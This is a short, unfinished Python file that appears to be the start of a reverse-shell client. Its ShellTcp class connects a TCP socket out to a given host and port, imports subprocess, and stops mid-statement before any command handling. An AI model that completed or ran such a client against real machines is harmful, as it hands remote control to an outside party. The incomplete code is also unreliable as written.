import os
import socket
from time import sleep 
import subprocess
from colorama import init, Fore 

init(autoreset=True)
class ShellTcp:
  def __init__(self, host, port):
    self.host = host
    self.port = port
    self.socket = None
  def servidor(self):
    try:
      self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      self.socket.connect((self.host, self.port))
    except Exception as e:
      print(f"erro {e}")
  def listen(self):
    data = self.socket.
    
